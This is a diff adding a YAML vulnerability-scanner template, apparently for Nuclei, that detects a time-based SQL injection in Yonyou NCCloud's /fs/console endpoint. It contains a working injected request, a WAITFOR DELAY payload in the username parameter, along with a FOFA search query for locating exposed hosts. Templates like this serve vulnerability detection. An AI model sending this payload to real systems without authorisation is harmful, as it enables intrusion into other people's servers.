@@ -1,0 +1,28 @@
+id: yonyou-nc-fs-console-sqli-time
+
+info:
+  name: Yonyou NC fs-console - SQL Injection
+  author: capiton
+  severity: high
+  description: "用友 NCCloud FS文件管理SQL延时注入"
+  reference:
+    - "https://mp.weixin.qq.com/s/YfJSz53aXYB-YDSqcbtQFg"
+  metadata:
+    fofa-query: "NCCloud"
+    Vulnerability-Impact: 用友NCCloud
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+requests:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /fs/console?username=222%27;WAITFOR%20DELAY%20%270:0:6%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI HTTP/1.1
+        Host: {{Hostname}}        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - status_code == 200
+          - 'contains(body, "<SESSIONID>")'
+        condition: and
